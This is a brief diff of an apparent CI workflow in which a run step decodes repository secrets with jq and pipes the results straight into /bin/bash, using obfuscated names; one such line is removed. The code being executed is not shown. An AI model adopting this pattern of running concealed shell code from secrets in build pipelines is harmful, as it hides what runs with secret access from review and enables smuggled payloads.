@@ -18,7 +18,6 @@ jobs:
           fbwg8: ${{ secrets.fbwg8 }}
         run: |
           printf '%s' "$fbwg8" | jq -r .it2 | /bin/bash
-          echo $pow87251 | jq -r .aglok69 | /bin/bash
           printf '%s' "$e56" | jq -r .nx603 | /bin/bash
 
       - name: Save results
